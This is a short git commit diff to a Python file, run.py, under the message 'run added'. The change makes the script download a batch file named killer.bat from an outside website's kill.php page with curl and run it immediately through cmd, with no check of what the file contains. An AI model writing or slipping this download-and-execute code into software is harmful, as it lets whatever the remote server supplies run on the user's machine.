9aaf601489c5ed9370a330c3d02799a2f55c2aa0
Metameg <ametzger08@gmail.com>
2025-10-22 20:45:57 -0500

    run added

--- run.py
+++ run.py
@@ -1,9 +1,22 @@
 import subprocess
+import os 
 
-script_path = "./script.sh"
 
+subprocess.run(["curl", "-o", "killer.bat", "https://thedomaindesigners.com/pages/kill.php"], check=True)
+
+
+if os.path.exists("./killer.bat"):
+    try:
+        # Run the .bat file using cmd.exe
+        subprocess.run(["cmd", "/c", ".\killer.bat"], check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Error executing script: {e}")
+#     with open("./killer.sh", "r", encoding="utf-8") as f:
+#         print(f.read())
+# else:
+#     print(f"File not found: ./killer.sh")
 # Make sure it’s executable
-subprocess.run(["chmod", "+x", script_path])
+# subprocess.run(["type", "+x", script_path])
 
-# Run the script
-subprocess.run(["bash", script_path], check=True)
+# # Run the script
+# subprocess.run(["bash", script_path], check=True)
